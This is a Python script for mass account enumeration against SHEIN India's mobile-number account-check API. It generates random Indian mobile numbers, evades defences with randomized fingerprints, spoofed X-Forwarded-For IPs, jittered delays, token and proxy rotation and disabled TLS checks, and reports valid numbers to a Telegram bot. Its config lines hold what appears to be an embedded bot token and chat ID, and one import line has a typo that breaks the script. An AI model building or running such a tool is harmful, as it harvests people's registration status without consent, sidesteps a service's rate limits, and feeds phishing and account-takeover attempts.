#!/usr/bin/env python3
"""
KOKU VPS HUNTER – Anti‑Detection SHEIN Number Checker (No Proxy Required)
---------------------------------------------------------------------------
- Runs on VPS (Railway) with full anti‑detection measures.
- Fingerprint randomization, random delays, token rotation.
- Multi‑threaded for high throughput.
- Optional Telegram bot for monitoring.
- All settings via environment variables.
- **No mandatory proxies** – but adding residential proxies later is recommended.
"""

import os
import sys
import json
import time
import random
import threading
import urllib3
import binascii
import requests
from datetime import datetime
from colorama import Fore, Style, init

# Suppress SSL warnings
urllib3.disable_warnings(ur3.exceptions.InsecureRequestWarning)

init(autoreset=True)

# ==================== ENVIRONMENT CONFIG ====================
BOT_TOKEN = os.environ.get("8620768791:AAEJcako-V1WL1axxxmTCGrkR7ZiiAZLQ-c", "")                     # Telegram bot token (leave empty to disable bot)
CHAT_ID = os.environ.get("7811286022", "")                         # Your Telegram chat ID
ENABLE_BOT = os.environ.get("ENABLE_BOT", "false").lower() == "true"

# Proxy support (optional)
PROXY_LIST = os.environ.get("PROXY_LIST", "")                   # Comma-separated: http://user:pass@ip:port,...

THREADS = int(os.environ.get("THREADS", "1"))                   # Number of worker threads
DELAY_BASE = float(os.environ.get("DELAY_BASE", "0.15"))        # Base delay in seconds (random jitter added)
TOKEN_REFRESH_INTERVAL = int(os.environ.get("TOKEN_REFRESH", "50")) # Refresh token every N checks per thread
STATS_FILE = os.environ.get("STATS_FILE", "finder_stats.json")
VALID_FILE = os.environ.get("VALID_FILE", "valid.txt")

# ==================== PROXY MANAGEMENT (optional) ====================
_proxies = [p.strip() for p in PROXY_LIST.split(",") if p.strip()] if PROXY_LIST else []
_proxy_lock = threading.Lock()

def get_random_proxy():
    """Return a random proxy dict or None if no proxies configured."""
    if not _proxies:
        return None
    with _proxy_lock:
        proxy_str = random.choice(_proxies)
        return {
            "http": proxy_str,
            "https": proxy_str
        }

# ==================== FINGERPRINT RANDOMIZATION ====================
ANDROID_VERSIONS = ['11', '12', '13', '14']
DEVICE_MODELS = ['SM-G991B', 'SM-S911B', 'SM-A536B', 'SM-F721B', 'SM-M127B']
CLIENT_TYPES = ['30', '31', '32', '33', '34']
LANGUAGES = ['en-IN', 'en-US', 'en-GB', 'hi-IN']

def random_fingerprint():
    """Generate random headers and device ID for each request."""
    android_ver = random.choice(ANDROID_VERSIONS)
    model = random.choice(DEVICE_MODELS)
    client_type = f"Android/{random.choice(CLIENT_TYPES)}"
    language = random.choice(LANGUAGES)
    device_id = binascii.hexlify(os.urandom(8)).decode()
    ip_spoof = f"{random.randint(11,199)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(1,250)}"
    return {
        "User-Agent": f"SHEIN/1.0.8 (Linux; Android {android_ver}; {model} Build/...)",
        "Client_type": client_type,
        "Client_version": "1.0.8",
        "Accept-Language": language,
        "Ad_id": device_id,
        "X-Forwarded-For": ip_spoof,
        "X-Tenant-Id": "SHEIN",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
    }

# ==================== THREAD‑SAFE STATS ====================
_stats_lock = threading.Lock()

def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"checks": 0, "hits": 0, "hit_list": []}
    try:
        with open(STATS_FILE, "r") as f:
            content = f.read().strip()
            if not content:
                return {"checks": 0, "hits": 0, "hit_list": []}
            return json.loads(content)
    except (json.JSONDecodeError, IOError):
        return {"checks": 0, "hits": 0, "hit_list": []}

def save_stats(checks, hits, hit_list):
    with open(STATS_FILE, "w") as f:
        json.dump({"checks": checks, "hits": hits, "hit_list": hit_list}, f)

def add_check():
    with _stats_lock:
        stats = load_stats()
        stats["checks"] += 1
        save_stats(stats["checks"], stats["hits"], stats["hit_list"])

def add_hit(number):
    with _stats_lock:
        stats = load_stats()
        stats["hits"] += 1
        if number not in stats["hit_list"]:
            stats["hit_list"].append(number)
        save_stats(stats["checks"], stats["hits"], stats["hit_list"])
        # Also save to valid.txt
        with open(VALID_FILE, "a") as f:
            f.write(f"{number}\n")

def reset_stats():
    with _stats_lock:
        save_stats(0, 0, [])
        if os.path.exists(VALID_FILE):
            os.remove(VALID_FILE)

# ==================== TELEGRAM HELPERS (optional) ====================
def send_telegram(message, parse_mode=None):
    if not BOT_TOKEN or not CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    if parse_mode:
        data["parse_mode"] = parse_mode
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"{Fore.RED}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")

def format_stats_message():
    stats = load_stats()
    checks = stats["checks"]
    hits = stats["hits"]
    hit_rate = (hits / checks * 100) if checks > 0 else 0
    return (
        f"📊 *KOKU VPS HUNTER – MONITOR*\n"
        f"⏱ Time: {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 *Checks:* `{checks:,}`\n"
        f"✅ *Hits:* `{hits}`\n"
        f"📈 *Hit Rate:* `{hit_rate:.4f}%`\n"
    )

def format_hits_message():
    stats = load_stats()
    hit_list = stats["hit_list"]
    if hit_list:
        all_hits = "\n".join(hit_list)
        return f"📋 *Hit List (copy below):*\n```\n{all_hits}\n```"
    else:
        return "📭 No hits yet."

# ==================== TOKEN & API FUNCTIONS ====================
def get_client_token(session, proxy=None):
    """Get client token using the given session (with optional proxy)."""
    url = "https://api.services.sheinindia.in/uaas/jwt/token/client"
    headers = random_fingerprint()  # fresh fingerprint for token request too
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
    try:
        r = session.post(url, headers=headers, data=data, proxies=proxy, timeout=15, verify=False)
        if r.status_code == 200:
            js = r.json()
            return js.get("access_token") or js.get("data", {}).get("access_token")
    except:
        pass
    return None

def check_number(session, number, token, proxy=None):
    """Check a single number, return True if hit."""
    url = "https://api.services.sheinindia.in/uaas/accountCheck"
    headers = random_fingerprint()
    headers["Authorization"] = f"Bearer {token}"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = f"mobileNumber={number}"
    try:
        r = session.post(url, headers=headers, data=data, proxies=proxy, timeout=10, verify=False)
        if r.status_code == 200:
            js = r.json()
            return js.get("encryptedId") is not None
        elif r.status_code == 429:
            return "RATE_LIMIT"
        elif r.status_code in (401, 403):
            return "AUTH_ERROR"
    except:
        pass
    return False

# ==================== NUMBER GENERATOR ====================
def generate_indian_mobile():
    prefixes = ['99','98','97','96','93','90','88','89','87','70','79','78','63','62']
    prefix = random.choice(prefixes)
    suffix = random.randint(10000000, 99999999)
    return f"{prefix}{suffix}"

# ==================== WORKER THREAD FUNCTION ====================
def worker(thread_id):
    print(f"{Fore.CYAN}[Thread {thread_id}] Started.{Style.RESET_ALL}")
    # Create a session for this thread
    session = requests.Session()
    # Get initial token
    token = None
    while token is None:
        proxy = get_random_proxy() if _proxies else None
        token = get_client_token(session, proxy)
        if not token:
            time.sleep(2)
    check_count = 0

    while True:
        try:
            # Optionally pick a new proxy for each request
            proxy = get_random_proxy() if _proxies else None

            # Generate number (threads may share the same count, but that's fine)
            number = generate_indian_mobile()

            # Random delay with jitter
            delay = DELAY_BASE + random.uniform(-0.05, 0.15)
            if delay < 0.05:
                delay = 0.05
            time.sleep(delay)

            # Occasionally take a longer pause (1% chance)
            if random.random() < 0.01:
                time.sleep(random.uniform(2, 5))

            # Perform check
            result = check_number(session, number, token, proxy)

            # Update stats
            add_check()

            if result is True:
                add_hit(number)
                print(f"{Fore.GREEN}[Thread {thread_id}] HIT: {number}{Style.RESET_ALL}")
            elif result == "RATE_LIMIT":
                print(f"{Fore.YELLOW}[Thread {thread_id}] Rate limit (429) – backing off...{Style.RESET_ALL}")
                time.sleep(random.uniform(2, 5))
            elif result == "AUTH_ERROR":
                print(f"{Fore.YELLOW}[Thread {thread_id}] Auth error – refreshing token...{Style.RESET_ALL}")
                token = get_client_token(session, proxy)
                if not token:
                    time.sleep(5)
            else:
                print(f"{Fore.RED}[Thread {thread_id}] BAD: {number}{Style.RESET_ALL}")

            # Refresh token periodically
            check_count += 1
            if check_count % TOKEN_REFRESH_INTERVAL == 0:
                new_token = get_client_token(session, proxy)
                if new_token:
                    token = new_token
                    print(f"{Fore.CYAN}[Thread {thread_id}] Token refreshed.{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[Thread {thread_id}] Error: {e}{Style.RESET_ALL}")
            time.sleep(2)

# ==================== TELEGRAM BOT (if enabled) ====================
if ENABLE_BOT and BOT_TOKEN and CHAT_ID:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes

    async def monitor_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(format_stats_message(), parse_mode='Markdown')

    async def hits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(format_hits_message(), parse_mode='Markdown')

    async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        reset_stats()
        await update.message.reply_text("🧹 Stats reset and valid.txt cleared.")

    async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
*KOKU VPS HUNTER – Commands*

/monitor – Show total checks, hits, and hit rate
/hits     – Get the full list of found numbers (copyable)
/clear    – Reset all stats and delete valid.txt
/help     – Show this help message

The bot scans numbers 24/7 with anti‑detection measures.
        """
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def scheduled_stats(context: ContextTypes.DEFAULT_TYPE):
        send_telegram(format_stats_message(), parse_mode='Markdown')

    def start_bot():
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("monitor", monitor_command))
        app.add_handler(CommandHandler("hits", hits_command))
        app.add_handler(CommandHandler("clear", clear_command))
        app.add_handler(CommandHandler("help", help_command))
        if app.job_queue:
            app.job_queue.run_repeating(scheduled_stats, interval=3600, first=3600)
        print(f"{Fore.GREEN}[BOT] Telegram bot running in main thread...{Style.RESET_ALL}")
        app.run_polling()
else:
    def start_bot():
        print(f"{Fore.YELLOW}[BOT] Telegram bot disabled.{Style.RESET_ALL}")
        # Just keep main thread alive by sleeping
        while True:
            time.sleep(60)

# ==================== MAIN ====================
def main():
    print(f"{Fore.GREEN}╔════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.GREEN}║     KOKU VPS HUNTER v1.0          ║{Style.RESET_ALL}")
    print(f"{Fore.GREEN}╚════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"Threads: {THREADS}")
    print(f"Base delay: {DELAY_BASE}s")
    print(f"Proxies: {'Yes (' + str(len(_proxies)) + ')' if _proxies else 'No'}")

    # Start worker threads
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(i+1,), daemon=True)
        t.start()
        time.sleep(0.5)  # stagger thread starts

    # Start Telegram bot (this blocks the main thread)
    start_bot()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Stopped by user.{Style.RESET_ALL}")
        sys.exit(0)